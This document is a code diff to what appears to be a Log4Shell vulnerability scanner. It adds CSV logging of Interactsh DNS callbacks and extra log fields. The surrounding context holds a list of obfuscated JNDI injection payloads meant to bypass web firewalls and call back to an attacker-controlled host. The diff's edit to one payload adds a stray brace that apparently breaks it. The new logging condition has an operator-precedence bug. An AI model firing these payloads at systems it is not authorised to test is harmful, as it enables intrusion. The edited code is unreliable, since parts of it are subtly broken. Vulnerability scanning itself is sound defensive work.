@@ -22,7 +22,7 @@ from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.PublicKey import RSA
 from Crypto.Hash import SHA256
 from termcolor import cprint
-
+import pandas as pd
 
 # Disable SSL warnings
 try:
@@ -57,7 +57,7 @@ waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{
                        "${${lower:jndi}:${lower:rmi}://{{callback_host}}/{{random}}}",
                        "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host}}/{{random}}}",
                        "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}",
-                       "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}://{{callback_host}}/{{random}}}",
+                       "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}",
                        "${jndi:dns://{{callback_host}}/{{random}}}",
                        "${jnd${123%25ff:-${123%25ff:-i:}}ldap://{{callback_host}}/{{random}}}",
                        "${jndi:dns://{{callback_host}}}",
@@ -142,6 +142,11 @@ parser.add_argument("--disable-http-redirects",
                     dest="disable_redirects",
                     help="Disable HTTP redirects. Note: HTTP redirects are useful as it allows the payloads to have a higher chance of reaching vulnerable systems.",
                     action='store_true')
+parser.add_argument("--log-output",
+                    dest="LOGGING",
+                    help="Store output of DNS callbaks into a csv file for reporting.",
+                    action='store_true')
+
 
 args = parser.parse_args()
 
@@ -242,6 +247,14 @@ class Interactsh:
         for i in data_list:
             decrypt_data = self.__decrypt_data(aes_key, i)
             result.append(self.__parse_log(decrypt_data))
+            
+        # create csv file output from result with pandas    
+        if args.LOGGING & len(result) > 0:
+            df = pd.DataFrame(result)
+            df.to_csv(f'{time.time()}.csv', index=False)
+            
+            cprint("[+] CSV with results created.", "green")
+        
         return result
 
     def __decrypt_data(self, aes_key, data):
@@ -258,7 +271,11 @@ class Interactsh:
     def __parse_log(self, log_entry):
         new_log_entry = {"timestamp": log_entry["timestamp"],
                          "host": f'{log_entry["full-id"]}.{self.domain}',
-                         "remote_address": log_entry["remote-address"]
+                         "remote_address": log_entry["remote-address"],
+                         "query_type": log_entry["q-type"],
+                         "raw_request": str(log_entry["raw-request"].replace("\n", " ").replace("\t", " ")),
+                         "raw_response": str(log_entry["raw-response"].replace("\n", " ").replace("\t", " ")),
+                         "protocol": log_entry["protocol"]
                          }
         return new_log_entry
 
